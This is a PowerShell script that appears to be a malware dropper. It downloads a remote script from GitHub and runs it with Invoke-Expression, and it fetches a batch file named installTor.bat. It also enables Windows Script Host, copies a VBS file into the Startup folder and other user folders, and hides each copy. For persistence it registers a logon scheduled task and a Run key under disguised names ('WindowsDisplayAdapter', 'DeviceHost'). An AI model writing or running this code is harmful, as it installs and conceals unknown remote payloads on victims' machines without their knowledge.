# Enable error handling
$ErrorActionPreference = "Stop"

iwr "https://raw.githubusercontent.com/RaupenInspektor/Obamaware/main/installTor.bat" -OutFile "$env:LOCALAPPDATA\e.bat"

try{
    New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 1 -Type DWord
} catch {
 Write-Host "Failed to enable vbs on startup: $_"
}

try {
    # Download and execute the PowerShell script
    $scriptUrl = "https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1"
    $scriptContent = Invoke-WebRequest -Uri $scriptUrl | Select-Object -ExpandProperty Content
    Invoke-Expression $scriptContent
    Write-Host "PowerShell script executed."
} catch {
    Write-Host "Failed to execute PowerShell script: $_"
}


# Download the VBS file to the Startup folder
try {
    $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\file.vbs"
    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
    Write-Host "VBS file downloaded."
} catch {
    Write-Host "Failed to download VBS file: $_"
}

try {
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "VBS file hidden."
    } else {
        Write-Host "VBS file not found."
    }
} catch {
    Write-Host "Failed to hide receiver.bat: $_"
}


# === Konfiguration ===
$TaskName  = 'WindowsDisplayAdapter'
$ScriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\file.vbs"

try {

    if (-not (Test-Path $ScriptPath)) {
    }

    # Aufgabe definieren
    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet
    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

    Register-ScheduledTask -TaskName $TaskName -InputObject $task -User $env:USERNAME -Force


    # Sofortiger Teststart
    Start-Process powershell.exe -ArgumentList "-NoProfile -File `"$ScriptPath`""
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}

try {
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "DeviceHost" `
                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}





# Download the VBS file 
try {
    $startupPath = "$env:APPDATA\file.vbs"
    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
    Write-Host "VBS file downloaded."
} catch {
    Write-Host "Failed to download VBS file: $_"
}

try {
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "VBS file hidden."
    } else {
        Write-Host "VBS file not found."
    }
} catch {
    Write-Host "Failed to hide receiver.bat: $_"
}

# === Konfiguration ===
$TaskName  = 'WindowsDisplayAdapter'
$ScriptPath = "$env:APPDATA\file.vbs"

try {

    if (-not (Test-Path $ScriptPath)) {
    }

    # Aufgabe definieren
    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet
    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

    Register-ScheduledTask -TaskName $TaskName -InputObject $task -User $env:USERNAME -Force
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}

try {
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "DeviceHost" `
                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}


# Download the VBS file 
try {
    $startupPath = "$env:USERPROFILE\file.vbs"
    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
    Write-Host "VBS file downloaded."
} catch {
    Write-Host "Failed to download VBS file: $_"
}

try {
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "VBS file hidden."
    } else {
        Write-Host "VBS file not found."
    }
} catch {
    Write-Host "Failed to hide receiver.bat: $_"
}

# === Konfiguration ===
$TaskName  = 'WindowsDisplayAdapter'
$ScriptPath = "$env:APPDATA\file.vbs"

try {

    if (-not (Test-Path $ScriptPath)) {
    }

    # Aufgabe definieren
    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet
    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

    Register-ScheduledTask -TaskName $TaskName -InputObject $task -User $env:USERNAME -Force
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}

try {
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "DeviceHost" `
                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}






# Download the VBS file 
try {
    $startupPath = "$env:USERPROFILE\Downloads\file.vbs"
    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
    Write-Host "VBS file downloaded."
} catch {
    Write-Host "Failed to download VBS file: $_"
}

try {
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "VBS file hidden."
    } else {
        Write-Host "VBS file not found."
    }
} catch {
    Write-Host "Failed to hide receiver.bat: $_"
}

# === Konfiguration ===
$TaskName  = 'WindowsDisplayAdapter'
$ScriptPath = "$env:APPDATA\file.vbs"

try {

    if (-not (Test-Path $ScriptPath)) {
    }

    # Aufgabe definieren
    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet
    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

    Register-ScheduledTask -TaskName $TaskName -InputObject $task -User $env:USERNAME -Force
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}

try {
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "DeviceHost" `
                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
}
catch {
    Write-Host "FEHLER: $($_.Exception.Message)"
}

& $scriptpath
















